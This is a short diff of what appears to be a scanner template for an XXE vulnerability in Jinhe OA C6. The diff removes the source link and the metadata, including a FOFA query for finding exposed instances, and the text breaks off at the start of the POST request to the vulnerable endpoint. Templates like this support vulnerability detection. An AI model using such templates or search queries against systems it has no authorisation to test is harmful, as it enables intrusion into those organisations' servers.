@@ -3,12 +3,8 @@ info:
   name: 金和OA_C6 ExcerptAppraiseSet存在XXE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dvphohieqexynptp'
+  description: ''
   tags: xxe,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dvphohieqexynptp
-    fofa: app="金和网络-金和 OA"
 http:
 - raw:
   - 'POST /c6/Jhsoft.Web.Appraise/ExcerptAppraiseSet.aspx/ HTTP/1.1
